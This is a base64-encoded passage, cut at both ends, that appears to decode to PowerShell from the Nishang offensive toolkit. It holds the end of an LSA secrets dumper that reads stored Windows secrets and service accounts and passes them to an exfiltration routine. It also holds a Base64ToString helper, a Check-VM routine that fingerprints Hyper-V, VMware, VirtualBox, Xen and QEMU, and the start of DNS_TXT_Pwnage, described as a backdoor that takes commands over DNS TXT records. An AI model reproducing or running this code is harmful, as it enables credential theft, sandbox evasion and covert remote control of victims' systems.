zdGVtID0gTmV3LU9iamVjdCBMU0FVdGlsLkxTQVV0aWwrTFNBX1VOSUNPREVfU1RSSU5HCiAgICAgICAgICAgICRsb2NhbHN5c3RlbS5CdWZmZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkbG9jYWxzeXN0ZW0uTGVuZ3RoID0gMAogICAgICAgICAgICAkbG9jYWxzeXN0ZW0uTWF4aW11bUxlbmd0aCA9IDAKCiAgICAgICAgICAgICMgU2VjcmV0IE5hbWUKICAgICAgICAgICAgJHNlY3JldE5hbWUgPSBOZXctT2JqZWN0IExTQVV0aWwuTFNBVXRpbCtMU0FfVU5JQ09ERV9TVFJJTkcKICAgICAgICAgICAgJHNlY3JldE5hbWUuQnVmZmVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCRteUtleSkKICAgICAgICAgICAgJHNlY3JldE5hbWUuTGVuZ3RoID0gW1VpbnQxNl0oJG15S2V5Lkxlbmd0aCAqIFtTeXN0ZW0uVGV4dC5Vbmljb2RlRW5jb2RpbmddOjpDaGFyU2l6ZSkKICAgICAgICAgICAgJHNlY3JldE5hbWUuTWF4aW11bUxlbmd0aCA9IFtVaW50MTZdKCgkbXlLZXkuTGVuZ3RoICsgMSkgKiBbU3lzdGVtLlRleHQuVW5pY29kZUVuY29kaW5nXTo6Q2hhclNpemUpCgogICAgICAgICAgICAjIEdldCBMU0EgUG9saWN5SGFuZGxlCiAgICAgICAgICAgICRsc2FQb2xpY3lIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICBbTFNBVXRpbC5MU0FVdGlsK0xTQV9BY2Nlc3NQb2xpY3ldJGFjY2VzcyA9IFtMU0FVdGlsLkxTQVV0aWwrTFNBX0FjY2Vzc1BvbGljeV06OlBPTElDWV9HRVRfUFJJVkFURV9JTkZPUk1BVElPTgogICAgICAgICAgICAkbHNhT3BlblBvbGljeUhhbmRsZSA9IFtMU0FVdGlsLkxTQVV0aWxdOjpMU0FPcGVuUG9saWN5KFtyZWZdJGxvY2FsU3lzdGVtLCBbcmVmXSRvYmplY3RBdHRyaWJ1dGVzLCAkYWNjZXNzLCBbcmVmXSRsc2FQb2xpY3lIYW5kbGUpCgogICAgICAgICAgICBpZigkbHNhT3BlblBvbGljeUhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgImxzYU9wZW5Qb2xpY3lIYW5kbGUgV2luZG93cyBFcnJvciBDb2RlOiAkbHNhT3BlblBvbGljeUhhbmRsZSIKICAgICAgICAgICAgICBDb250aW51ZQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFJldHJpZXZlIFByaXZhdGUgRGF0YQogICAgICAgICAgICAkcHJpdmF0ZURhdGEgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkbnRzUmVzdWx0ID0gW0xTQVV0aWwuTFNBVXRpbF06OkxzYVJldHJpZXZlUHJpdmF0ZURhdGEoJGxzYVBvbGljeUhhbmRsZSwgW3JlZl0kc2VjcmV0TmFtZSwgW3JlZl0kcHJpdmF0ZURhdGEpCgogICAgICAgICAgICAkbHNhQ2xvc2UgPSBbTFNBVXRpbC5MU0FVdGlsXTo6THNhQ2xvc2UoJGxzYVBvbGljeUhhbmRsZSkKCiAgICAgICAgICAgICRsc2FOdFN0YXR1c1RvV2luRXJyb3IgPSBbTFNBVXRpbC5MU0FVdGlsXTo6THNhTnRTdGF0dXNUb1dpbkVycm9yKCRudHNSZXN1bHQpCgogICAgICAgICAgICBpZigkbHNhTnRTdGF0dXNUb1dpbkVycm9yIC1uZSAwKSB7CiAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAibHNhTnRzU3RhdHVzVG9XaW5FcnJvcjogJGxzYU50U3RhdHVzVG9XaW5FcnJvciIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgW0xTQVV0aWwuTFNBVXRpbCtMU0FfVU5JQ09ERV9TVFJJTkddJGx1c1NlY3JldERhdGEgPQogICAgICAgICAgICBbTFNBVXRpbC5MU0FVdGlsK0xTQV9VTklDT0RFX1NUUklOR11bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLm1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkcHJpdmF0ZURhdGEsIFtTeXN0ZW0uVHlwZV1bTFNBVXRpbC5MU0FVdGlsK0xTQV9VTklDT0RFX1NUUklOR10pCgogICAgICAgICAgICBUcnkgewogICAgICAgICAgICAgIFtzdHJpbmddJHZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5tYXJzaGFsXTo6UHRyVG9TdHJpbmdBdXRvKCRsdXNTZWNyZXREYXRhLkJ1ZmZlcikKICAgICAgICAgICAgICAkdmFsdWUgPSAkdmFsdWUuU3ViU3RyaW5nKDAsICgkbHVzU2VjcmV0RGF0YS5MZW5ndGggLyAyKSkKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaCB7CiAgICAgICAgICAgICAgJHZhbHVlID0gIiIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJGtleSAtbWF0Y2ggIl5fU0NfIikgewogICAgICAgICAgICAgICMgR2V0IFNlcnZpY2UgQWNjb3VudAogICAgICAgICAgICAgICRzZXJ2aWNlTmFtZSA9ICRrZXkgLVJlcGxhY2UgIl5fU0NfIgogICAgICAgICAgICAgIFRyeSB7CiAgICAgICAgICAgICAgICAjIEdldCBTZXJ2aWNlIEFjY291bnQKICAgICAgICAgICAgICAgICRzZXJ2aWNlID0gR2V0LVdtaU9iamVjdCAtUXVlcnkgIlNFTEVDVCBTdGFydE5hbWUgRlJPTSBXaW4zMl9TZXJ2aWNlIFdIRVJFIE5hbWUgPSAnJHNlcnZpY2VOYW1lJyIgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgICRhY2NvdW50ID0gJHNlcnZpY2UuU3RhcnROYW1lCiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIENhdGNoIHsKICAgICAgICAgICAgICAgICRhY2NvdW50ID0gIiIKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgJGFjY291bnQgPSAiIgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIFJldHVybiBPYmplY3QKICAgICAgICAgICAkb2JqID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsKICAgICAgICAgICAgICBOYW1lID0gJGtleTsKICAgICAgICAgICAgICBTZWNyZXQgPSAkdmFsdWU7CiAgICAgICAgICAgICAgQWNjb3VudCA9ICRBY2NvdW50CiAgICAgICAgICAgIH0gCiAgICAgICAgCiAgICAgICAgICAgICRwYXN0ZXZhbHVlID0gJG9iaiB8IFNlbGVjdC1PYmplY3QgTmFtZSwgQWNjb3VudCwgU2VjcmV0LCBAe05hbWU9IkNvbXB1dGVyTmFtZSI7RXhwcmVzc2lvbj17JGVudjpDT01QVVRFUk5BTUV9fQogICAgICAgICAgICAkcGFzdGV2YWx1ZQoKICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yIC1NZXNzYWdlICJQYXRoIG5vdCBmb3VuZDogJHJlZ1BhdGgiIC1DYXRlZ29yeSBPYmplY3ROb3RGb3VuZAogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgICBlbmQgewogICAgICAgIGlmKFRlc3QtUGF0aCAkdGVtcFJlZ1BhdGgpIHsKICAgICAgICAgIFJlbW92ZS1JdGVtIC1QYXRoICJIS0xNOlxcU0VDVVJJVFlcUG9saWN5XFNlY3JldHNcTXlTZWNyZXQiIC1SZWN1cnNlIC1Gb3JjZQogICAgICAgIH0KICAgICAgIGlmKCRleGZpbCAtZXEgJFRydWUpCiAgICAgICB7CiAgICAgICAgICAgIERvLUV4ZmlsdHJhdGlvbiAiTFNBIFNlY3JldHM6ICIgIiRwYXN0ZXZhbHVlIiAiJHVzZXJuYW1lIiAiJHBhc3N3b3JkIiAiJGRldl9rZXkiICIka2V5b3V0b3B0aW9uIgogICAgICAgfQogICAgICB9CgogICAgfQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjQ29udmVydHMgQmFzZTY0IHN0cmluZyBvciBmaWxlIHRvIHBsYWluLiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIEJhc2U2NFRvU3RyaW5nCnsKCjwjCi5TWU5PUFNJUwpIZWxwZXIgZnVuY2l0b24gd2hpY2ggZGVjb2RlcyBhIGJhc2U2NCBzdHJpbmcgdG8gcmVhZGFibGUuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGRlY29kZXMgYSBiYXNlNjQgc3RyaW5nIHRvIHJlYWRhYmxlLgoKLlBBUkFNRVRFUiBCYXNlNjRTdHJmaWxlClRoZSBmaWxlbmFtZSB3aGljaCBjb250YWlucyBiYXNlNjQgc3RyaW5nIHRvIGJlIGRlY29kZWQuClVzZSB0aGUgcGFyYW1ldGVyIC1Jc1N0cmluZyB3aGlsZSB1c2luZyBhIHN0cmluZyBpbnN0ZWFkIG9mIGZpbGUuCgouRVhBTVBMRQpQUyA+IEJhc2U2NFRvU3RyaW5nIGJhc2U2NC50eHQKCi5FWEFNUExFClBTID4gQmFzZTY0VG9TdHJpbmcgZEdWemRHVnpkQT09IC1Jc1N0cmluZwoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSggCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRCYXNlNjRTdHJmaWxlLCAKICAgICAgICAKICAgICAgICBbU3dpdGNoXSAKICAgICAgICAkSXNTdHJpbmcKICAgICkKCiAgICBpZigkSXNTdHJpbmcgLWVxICR0cnVlKQogICAgewogICAgCiAgICAgICAgJGJhc2U2NHN0cmluZyAgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRCYXNlNjRTdHJmaWxlKQogICAgICAgCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGJhc2U2NHN0cmluZyAgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKChHZXQtQ29udGVudCAkQmFzZTY0U3RyZmlsZSkpCiAgICB9CiAgICAKICAgICRkZWNvZGVkc3RyaW5nID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJhc2U2NHN0cmluZykKICAgICRkZWNvZGVkc3RyaW5nCiAgICB9CgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjRGV0ZWN0cyB3aGV0aGVyIGl0IGlzIGluIGEga25vd24gdmlydHVhbCBtYWNoaW5lLiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyNCYXNlZCBvbiBDaGVja1ZNIHBvc3QgbW9kdWxlIGluIG1zZiBieSBDYXJsb3MgUGVyZXoKZnVuY3Rpb24gQ2hlY2stVk0KewoKPCMgCi5TWU5PUFNJUyAKSGVscGVyIGZ1bmN0aW9uIHdoaWNoIGRldGVjdHMgd2hldGhlciBpdCBpcyBydW5uaW5nIGluIGEga25vd24gdmlydHVhbCBtYWNoaW5lLgogCi5ERVNDUklQVElPTiAKVGhpcyBzY3JpcHQgdXNlcyBrbm93biBwYXJhbWV0ZXJzIG9yICdmaW5nZXJwcmludHMnIG9mIEh5cGVyLVYsIFZNV2FyZSwgVmlydHVhbCBQQywgVmlydHVhbCBCb3gsClhlbiBhbmQgUUVNVSBmb3IgZGV0ZWN0aW5nIHRoZSBlbnZpcm9ubWVudC4KCi5FWEFNUExFIApQUyA+IENoZWNrLVZNIAogCi5MSU5LIApodHRwOi8vbGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLwpodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKLk5PVEVTIApUaGUgc2NyaXB0IGRyYXdzIGhlYXZpbHkgZnJvbSBjaGVja3ZtLnJiIHBvc3QgbW9kdWxlIGZyb20gbXNmLgpodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL2Jsb2IvbWFzdGVyL21vZHVsZXMvcG9zdC93aW5kb3dzL2dhdGhlci9jaGVja3ZtLnJiCiM+CiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgpCiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gIlNpbGVudGx5Q29udGludWUiCiAgICAjSHlwZXItVgogICAgJGh5cGVydiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0CiAgICBpZiAoKCRoeXBlcnYgLW1hdGNoICJIeXBlci1WIikgLW9yICgkaHlwZXJ2IC1tYXRjaCAiVmlydHVhbE1hY2hpbmUiKSkKICAgICAgICB7CiAgICAgICAgICAgICRoeXBlcnZtID0gJHRydWUKICAgICAgICB9CgogICAgaWYgKCEkaHlwZXJ2bSkKICAgICAgICB7CiAgICAgICAgICAgICRoeXBlcnYgPSBHZXQtSXRlbVByb3BlcnR5IGhrbG06XEhBUkRXQVJFXERFU0NSSVBUSU9OXFN5c3RlbSAtTmFtZSBTeXN0ZW1CaW9zVmVyc2lvbgogICAgICAgICAgICBpZiAoJGh5cGVydiAtbWF0Y2ggInZydHVhbCIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGh5cGVydm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgIAogICAgaWYgKCEkaHlwZXJ2bSkKICAgICAgICB7CiAgICAgICAgICAgICRoeXBlcnYgPSBHZXQtQ2hpbGRJdGVtIEhLTE06XEhBUkRXQVJFXEFDUElcRkFEVAogICAgICAgICAgICBpZiAoJGh5cGVydiAtbWF0Y2ggInZydHVhbCIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGh5cGVydm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAgICAgCiAgICBpZiAoISRoeXBlcnZtKQogICAgICAgIHsKICAgICAgICAgICAgJGh5cGVydiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcSEFSRFdBUkVcQUNQSVxSU0RUCiAgICAgICAgICAgIGlmICgkaHlwZXJ2IC1tYXRjaCAidnJ0dWFsIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaHlwZXJ2bSA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgIGlmICghJGh5cGVydm0pCiAgICAgICAgewogICAgICAgICAgICAkaHlwZXJ2ID0gR2V0LUNoaWxkSXRlbSBIS0xNOlxTWVNURU1cQ29udHJvbFNldDAwMVxTZXJ2aWNlcwogICAgICAgICAgICBpZiAoKCRoeXBlcnYgLW1hdGNoICJ2bWljaGVhcnRiZWF0IikgLW9yICgkaHlwZXJ2IC1tYXRjaCAidm1pY3ZzcyIpIC1vciAoJGh5cGVydiAtbWF0Y2ggInZtaWNzaHV0ZG93biIpIC1vciAoJGh5cGVydiAtbWF0Y2ggInZtaWV4Y2hhbmdlIikpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGh5cGVydm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgCiAgICBpZiAoJGh5cGVydm0pCiAgICAgICAgewogICAgCiAgICAgICAgICAgICJUaGlzIGlzIGEgSHlwZXItViBtYWNoaW5lLiIKICAgIAogICAgICAgIH0KCiAgICAjVk1XQVJFCgogICAgJHZtd2FyZSA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcU1lTVEVNXENvbnRyb2xTZXQwMDFcU2VydmljZXMKICAgIGlmICgoJHZtd2FyZSAtbWF0Y2ggInZtZGVidWciKSAtb3IgKCR2bXdhcmUgLW1hdGNoICJ2bW1vdXNlIikgLW9yICgkdm13YXJlIC1tYXRjaCAiVk1Ub29scyIpIC1vciAoJHZtd2FyZSAtbWF0Y2ggIlZNTUVNQ1RMIikpCiAgICAgICAgewogICAgICAgICAgICAkdm13YXJldm0gPSAkdHJ1ZQogICAgICAgIH0KCiAgICBpZiAoISR2bXdhcmV2bSkKICAgICAgICB7CiAgICAgICAgICAgICR2bXdhcmUgPSBHZXQtSXRlbVByb3BlcnR5IGhrbG06XEhBUkRXQVJFXERFU0NSSVBUSU9OXFN5c3RlbVxCSU9TIC1OYW1lIFN5c3RlbU1hbnVmYWN0dXJlcgogICAgICAgICAgICBpZiAoJHZtd2FyZSAtbWF0Y2ggInZtd2FyZSIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHZtd2FyZXZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAKICAgIGlmICghJHZtd2FyZXZtKQogICAgICAgIHsKICAgICAgICAgICAgJHZtd2FyZSA9IEdldC1DaGlsZGl0ZW0gaGtsbTpcaGFyZHdhcmVcZGV2aWNlbWFwXHNjc2kgLXJlY3Vyc2UgfCBncCAtTmFtZSBpZGVudGlmaWVyCiAgICAgICAgICAgIGlmICgkdm13YXJlIC1tYXRjaCAidm13YXJlIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkdm13YXJldm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICBpZiAoISR2bXdhcmV2bSkKICAgICAgICB7CiAgICAgICAgICAgICR2bXdhcmUgPSBHZXQtUHJvY2VzcwogICAgICAgICAgICBpZiAoKCR2bXdhcmUgLWVxICJ2bXdhcmV1c2VyLmV4ZSIpIC1vciAoJHZtd2FyZSAtbWF0Y2ggInZtd2FyZXRyYXkuZXhlIikpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHZtd2FyZXZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgaWYgKCR2bXdhcmV2bSkKICAgICAgICB7CiAgICAKICAgICAgICAgICAgIlRoaXMgaXMgYSBWTVdhcmUgbWFjaGluZS4iCiAgICAKICAgICAgICB9CiAgICAKICAgICNWaXJ0dWFsIFBDCgogICAgJHZwYyA9IEdldC1Qcm9jZXNzCiAgICBpZiAoKCR2cGMgLWVxICJ2bXVzcnZjLmV4ZSIpIC1vciAoJHZwYyAtbWF0Y2ggInZtc3J2Yy5leGUiKSkKICAgICAgICB7CiAgICAgICAgJHZwY3ZtID0gJHRydWUKICAgICAgICB9CgogICAgaWYgKCEkdnBjdm0pCiAgICAgICAgewogICAgICAgICAgICAkdnBjID0gR2V0LVByb2Nlc3MKICAgICAgICAgICAgaWYgKCgkdnBjIC1lcSAidm13YXJldXNlci5leGUiKSAtb3IgKCR2cGMgLW1hdGNoICJ2bXdhcmV0cmF5LmV4ZSIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR2cGN2bSA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKICAgIGlmICghJHZwY3ZtKQogICAgICAgIHsKICAgICAgICAgICAgJHZwYyA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcU1lTVEVNXENvbnRyb2xTZXQwMDFcU2VydmljZXMKICAgICAgICAgICAgaWYgKCgkdnBjIC1tYXRjaCAidnBjLXMzIikgLW9yICgkdnBjIC1tYXRjaCAidnBjdWh1YiIpIC1vciAoJHZwYyAtbWF0Y2ggIm1zdm1tb3VmIikpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHZwY3ZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgaWYgKCR2cGN2bSkKICAgICAgICB7CiAgICAKICAgICAgICAiVGhpcyBpcyBhIFZpcnR1YWwgUEMuIgogICAgCiAgICAgICAgfQoKCiAgICAjVmlydHVhbCBCb3gKCiAgICAkdmIgPSBHZXQtUHJvY2VzcwogICAgaWYgKCgkdmIgLWVxICJ2Ym94c2VydmljZS5leGUiKSAtb3IgKCR2YiAtbWF0Y2ggInZib3h0cmF5LmV4ZSIpKQogICAgICAgIHsKICAgIAogICAgICAgICR2YnZtID0gJHRydWUKICAgIAogICAgICAgIH0KICAgIGlmICghJHZidm0pCiAgICAgICAgewogICAgICAgICAgICAkdmIgPSBHZXQtQ2hpbGRJdGVtIEhLTE06XEhBUkRXQVJFXEFDUElcRkFEVAogICAgICAgICAgICBpZiAoJHZiIC1tYXRjaCAidmJveF8iKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR2YnZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgaWYgKCEkdmJ2bSkKICAgICAgICB7CiAgICAgICAgICAgICR2YiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcSEFSRFdBUkVcQUNQSVxSU0RUCiAgICAgICAgICAgIGlmICgkdmIgLW1hdGNoICJ2Ym94XyIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHZidm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAKICAgIGlmICghJHZidm0pCiAgICAgICAgewogICAgICAgICAgICAkdmIgPSBHZXQtQ2hpbGRpdGVtIGhrbG06XGhhcmR3YXJlXGRldmljZW1hcFxzY3NpIC1yZWN1cnNlIHwgZ3AgLU5hbWUgaWRlbnRpZmllcgogICAgICAgICAgICBpZiAoJHZiIC1tYXRjaCAidmJveCIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHZidm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCgoKICAgIGlmICghJHZidm0pCiAgICAgICAgewogICAgICAgICAgICAkdmIgPSBHZXQtSXRlbVByb3BlcnR5IGhrbG06XEhBUkRXQVJFXERFU0NSSVBUSU9OXFN5c3RlbSAtTmFtZSBTeXN0ZW1CaW9zVmVyc2lvbgogICAgICAgICAgICBpZiAoJHZiIC1tYXRjaCAidmJveCIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICR2YnZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiAgCgogICAgaWYgKCEkdmJ2bSkKICAgICAgICB7CiAgICAgICAgICAgICR2YiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcU1lTVEVNXENvbnRyb2xTZXQwMDFcU2VydmljZXMKICAgICAgICAgICAgaWYgKCgkdmIgLW1hdGNoICJWQm94TW91c2UiKSAtb3IgKCR2YiAtbWF0Y2ggIlZCb3hHdWVzdCIpIC1vciAoJHZiIC1tYXRjaCAiVkJveFNlcnZpY2UiKSAtb3IgKCR2YiAtbWF0Y2ggIlZCb3hTRiIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR2YnZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgaWYgKCR2YnZtKQogICAgICAgIHsKICAgIAogICAgICAgICJUaGlzIGlzIGEgVmlydHVhbCBCb3guIgogICAgCiAgICAgICAgfQoKCgogICAgI1hlbgoKICAgICR4ZW4gPSBHZXQtUHJvY2VzcwoKICAgIGlmICgkeGVuIC1lcSAieGVuc2VydmljZS5leGUiKQogICAgICAgIHsKICAgIAogICAgICAgICR4ZW52bSA9ICR0cnVlCiAgICAKICAgICAgICB9CiAgICAKICAgIGlmICghJHhlbnZtKQogICAgICAgIHsKICAgICAgICAgICAgJHhlbiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcSEFSRFdBUkVcQUNQSVxGQURUCiAgICAgICAgICAgIGlmICgkeGVuIC1tYXRjaCAieGVuIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkeGVudm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICBpZiAoISR4ZW52bSkKICAgICAgICB7CiAgICAgICAgICAgICR4ZW4gPSBHZXQtQ2hpbGRJdGVtIEhLTE06XEhBUkRXQVJFXEFDUElcRFNEVAogICAgICAgICAgICBpZiAoJHhlbiAtbWF0Y2ggInhlbiIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHhlbnZtID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAKICAgIGlmICghJHhlbnZtKQogICAgICAgIHsKICAgICAgICAgICAgJHhlbiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcSEFSRFdBUkVcQUNQSVxSU0RUCiAgICAgICAgICAgIGlmICgkeGVuIC1tYXRjaCAieGVuIikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkeGVudm0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAKICAgIGlmICghJHhlbnZtKQogICAgICAgIHsKICAgICAgICAgICAgJHhlbiA9IEdldC1DaGlsZEl0ZW0gSEtMTTpcU1lTVEVNXENvbnRyb2xTZXQwMDFcU2VydmljZXMKICAgICAgICAgICAgaWYgKCgkeGVuIC1tYXRjaCAieGVuZXZ0Y2huIikgLW9yICgkeGVuIC1tYXRjaCAieGVubmV0IikgLW9yICgkeGVuIC1tYXRjaCAieGVubmV0NiIpIC1vciAoJHhlbiAtbWF0Y2ggInhlbnN2YyIpIC1vciAoJHhlbiAtbWF0Y2ggInhlbnZkYiIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR4ZW52bSA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQoKCiAgICBpZiAoJHhlbnZtKQogICAgICAgIHsKICAgIAogICAgICAgICJUaGlzIGlzIGEgWGVuIE1hY2hpbmUuIgogICAgCiAgICAgICAgfQoKCiAgICAjUUVNVQoKICAgICRxZW11ID0gR2V0LUNoaWxkaXRlbSBoa2xtOlxoYXJkd2FyZVxkZXZpY2VtYXBcc2NzaSAtcmVjdXJzZSB8IGdwIC1OYW1lIGlkZW50aWZpZXIKICAgIGlmICgkcWVtdSAtbWF0Y2ggInFlbXUiKQogICAgICAgIHsKICAgIAogICAgICAgICAgICAkcWVtdXZtID0gJHRydWUKICAgIAogICAgICAgIH0KICAgIAogICAgaWYgKCEkcWVtdXZtKQogICAgICAgIHsKICAgICAgICAkcWVtdSA9IEdldC1JdGVtUHJvcGVydHkgaGtsbTpIQVJEV0FSRVxERVNDUklQVElPTlxTeXN0ZW1cQ2VudHJhbFByb2Nlc3NvclwwIC1OYW1lIFByb2Nlc3Nvck5hbWVTdHJpbmcKICAgICAgICBpZiAoJHFlbXUgLW1hdGNoICJxZW11IikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHFlbXV2bSA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICB9ICAgIAoKICAgIGlmICgkcWVtdXZtKQogICAgICAgIHsKICAgIAogICAgICAgICJUaGlzIGlzIGEgUWVtdSBtYWNoaW5lLiIKICAgIAogICAgICAgIH0KICAgIAp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjQWN0cyBhcyBhIGJhY2tkb29yIGFuZCBpcyBjYXBhYmxlIG9mIHJlY2lldmluZyBjb21tYW5kcyBhbmQgUG93ZXJTaGVsbCBzY3JpcHRzIGZyb20gRE5TIFRYVCBxdWVyaWVzLiMjIyMjIyMjIyMjIyMjIyMjIyMjIwpmdW5jdGlvbiBETlNfVFhUX1B3bmFnZQp7Cgo8IwouU1lOT1BTSVMKQSBiYWNrZG9vciBjYXBhYmxlIG9mIHJlY2lldmluZyBjb21tYW5kcyBhbmQgUG93ZXJTaGVsbCBzY3JpcHRzIGZyb20gRE5TIFRYVCBxdWVyaWVzLgoKLkRFU0NSSVBUSU9OClRoaXMgc2NyaXB0IGNvbnRpbnVvdXNseSBxdWVyaWVzIGEgZG9tYWluJ3MgVFhUIHJlY29yZHMuIEl0IGNvdWxkIGJlIHNlbnQgY29tbWFuZHMgYW5kIHBvd2Vyc2hlbGwgc2NyaXB0cyB1c2luZyB0aGUgVFhUIHJlY29yZHMgd2hpY2ggYXJlIGV4ZWN1dGVkIG9uIHRoZSB0YXJnZXQgbWFjaGluZS4KVGhlIFBvd2VyU2hlbGwgc2NyaXB0IHdoaWNoIHdvdWxkIGJlIHNlcnZlZCBhcyBUWFQgcmVjb3JkIG11c3QgYmUgZ2VuZXJhdGVkIHVzaW5nIE91dC1EbnNUeHQucHMxIGluIHRoZSBVdGlsaXR5IGZvbGRlci4KCldoaWxlIHVzaW5nIHRoZSBBdXRoTlMgb3B0aW9uIGl0IHNob3VsZCBiZSBrZXB0IGluIG1pbmQgdGhhdCBpdCBpbmNyZWFzZXMgY2hhbmNlcyBvZiBkZXRlY3Rpb24uCkxlYXZpbmcgdGhlIEROUyByZXNvbHV0aW9uIHRvIGF1dGhvcmlzZWQgbmFtZSBzZXJ2ZXIgb2YgYSB0YXJnZXQgZW52aXJv